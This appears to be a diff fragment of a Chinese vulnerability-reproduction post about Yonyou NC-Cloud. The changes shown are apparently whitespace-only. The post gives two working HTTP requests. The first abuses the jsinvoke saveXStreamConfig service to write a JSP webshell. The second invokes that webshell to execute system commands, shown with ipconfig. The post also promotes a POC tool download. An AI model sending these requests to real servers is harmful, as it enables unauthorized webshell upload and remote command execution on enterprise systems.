@@ -34,7 +34,7 @@ CNVD 编号:
 3. 影响版本
 -------
 
-全版本 
+全版本 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3b8sCa3Pb0uLRwM6DpygSwJLFjbdH38vx9jIVpXzsU1npFD5ZoFx29d1uicSjG6y2v3WsRtH7JibUJg/640?wx_fmt=png)
 
@@ -51,13 +51,13 @@ app="用友 - NC-Cloud"
 漏洞数据包, 如下，该数据包上传 823780482.jsp 的 webshell
 
 ```
-POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
-Host: 127.0.0.1
-User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
-Accept: */*
-Connection: Keep-Alive
-Content-Length: 253
-Content-Type: application/x-www-form-urlencoded
+POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
+Host: 127.0.0.1
+User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
+Accept: */*
+Connection: Keep-Alive
+Content-Length: 253
+Content-Type: application/x-www-form-urlencoded
 
 {"serviceName":"nc.itf.iufo.IBaseSPService","methodName":"saveXStreamConfig","parameterTypes":["java.lang.Object","java.lang.String"],"parameters":["${param.getClass().forName(param.error).newInstance().eval(param.cmd)}","webapps/nc_web/823780482.jsp"]}
 
@@ -67,20 +67,20 @@ Content-Type: application/x-www-form-urlencoded
 访问如下数据包执行命令，如下执行 ipconfig 命令
 
 ```
-POST /823780482.jsp?error=bsh.Interpreter HTTP/1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
-Accept-Encoding: gzip, deflate
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-Connection: close
-Host: 127.0.0.1
-Cache-Control: max-age=0
-Upgrade-Insecure-Requests: 1
-Accept-Language: zh-CN,zh;q=0.9
-Cookie: cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server
-If-None-Match: W/"1571-1589211696000"
-If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 98
+POST /823780482.jsp?error=bsh.Interpreter HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36
+Accept-Encoding: gzip, deflate
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Connection: close
+Host: 127.0.0.1
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: cookiets=1681785470496; JSESSIONID=33989F450B1EA57D4D3ED07A343770FF.server
+If-None-Match: W/"1571-1589211696000"
+If-Modified-Since: Mon, 11 May 2020 15:41:36 GMT
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 98
 
 cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig").getInputStream())
 
@@ -92,7 +92,7 @@ cmd=org.apache.commons.io.IOUtils.toString(Runtime.getRuntime().exec("ipconfig")
 6.POC&EXP
 ---------
 
-关注公众号  南风漏洞复现文库 并回复  漏洞复现 43  即可获得该 POC 工具下载地址： 
+关注公众号  南风漏洞复现文库 并回复  漏洞复现 43  即可获得该 POC 工具下载地址： 
 
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/HsJDm7fvc3b8sCa3Pb0uLRwM6DpygSwJ9h1cx03CSDQY33TBzlUiblojxNZn6CibWPiauf56qA2oaQMkR4iccSYFLA/640?wx_fmt=png)
 
